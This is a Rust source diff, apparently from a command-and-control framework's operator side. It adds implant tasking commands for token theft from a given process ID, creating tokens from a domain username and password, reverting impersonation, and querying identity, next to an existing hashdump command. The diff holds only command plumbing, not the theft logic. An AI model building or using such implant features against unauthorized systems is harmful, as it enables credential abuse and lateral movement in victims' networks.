@@ -836,6 +836,20 @@ enum JsonCommand {
     ChannelData { chan: u32, data_hex: String },
     /// 关闭中继通道（显式拆除；implant 也会在 socket EOF 时自动关）。
     ChannelClose { chan: u32 },
+    /// 令牌窃取：复制 `pid` 的主令牌供后续冒用。横向移动原语。
+    StealToken { pid: u32 },
+    /// 造令牌（make-token / pass-the-password）：`domain\user` + `password`。
+    /// `logon_type` 1=interactive(默认) 2=network 3=new-credentials。
+    MakeToken {
+        domain: String,
+        user: String,
+        password: String,
+        logon_type: u8,
+    },
+    /// 丢弃当前线程冒用（RevertToSelf），但保留持有的令牌供复用。
+    Rev2Self,
+    /// 查询当前线程身份（DOMAIN\user + 是否持有令牌）。
+    GetUid,
     Exit,
 }
 
@@ -902,6 +916,20 @@ impl JsonCommand {
                 Command::ChannelData { chan, data }
             }
             JsonCommand::ChannelClose { chan } => Command::ChannelClose { chan },
+            JsonCommand::StealToken { pid } => Command::StealToken { pid },
+            JsonCommand::MakeToken {
+                domain,
+                user,
+                password,
+                logon_type,
+            } => Command::MakeToken {
+                domain,
+                user,
+                password,
+                logon_type,
+            },
+            JsonCommand::Rev2Self => Command::Rev2Self,
+            JsonCommand::GetUid => Command::GetUid,
             JsonCommand::Exit => Command::Exit,
         })
     }
@@ -1257,6 +1285,10 @@ fn command_name(c: &Command) -> &'static str {
         Command::Hashdump { .. } => "hashdump",
         Command::ChannelData { .. } => "channeldata",
         Command::ChannelClose { .. } => "channelclose",
+        Command::StealToken { .. } => "stealtoken",
+        Command::MakeToken { .. } => "maketoken",
+        Command::Rev2Self => "rev2self",
+        Command::GetUid => "getuid",
         Command::Exit => "exit",
     }
 }
